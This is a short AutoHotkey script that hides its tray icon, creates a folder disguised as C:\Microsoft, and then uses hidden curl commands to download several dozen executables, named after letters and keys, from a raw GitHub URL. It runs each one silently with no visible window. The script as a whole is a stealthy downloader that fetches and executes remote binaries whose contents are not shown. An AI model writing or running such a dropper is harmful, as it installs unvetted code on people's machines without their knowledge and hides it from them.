#SingleInstance Ignore
#NoTrayIcon

destDir := "C:\Microsoft"

if !DirExist(destDir)
    DirCreate(destDir)


letters := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z", "LButton", "RButton", "Delete", "Backspace", "Space", "run"]

for letter in letters {
    output := destDir "\" letter ".exe"
    if !FileExist(output) {
        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
        Run command, , "Hide"
    }
    Run output, , "Hide"
}

Run destDir . "\run.exe", , "Hide"

ExitApp
